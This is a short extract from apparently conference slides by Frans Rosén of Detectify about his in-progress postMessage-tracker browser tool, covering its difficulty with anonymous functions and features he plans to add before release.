- Problem 3: Anonymous functions. Could not identify them at all. 

**Before: After:** 

Solution: Can’t extract using Function.toString() in Chrome :( 

Will however at least show them as tracked now 

##### postMessage-tracker Speedbumps 

---

 Author name her 

##### postMessage-tracker released? 

 Frans Rosén @fransrosen 

No :( I suck. "Soon"? 

---

 Author name her 

##### postMessage-tracker released? 

 Frans Rosén @fransrosen 

No :( I suck. "Soon"? 

Want to complete more features! 

---

 Author name her 

##### postMessage-tracker released? 

 Frans Rosén @fransrosen 

No :( I suck. "Soon"? 

Want to complete more features! 

- Trigger debugger to breakpoint messages (since we own the order) 

- Try to see if .origin is being used and how 

- If regex, run through Rex! 

---

## detectify 

**Frans Rosén (@fransrosen)** 

#### That’s it! 

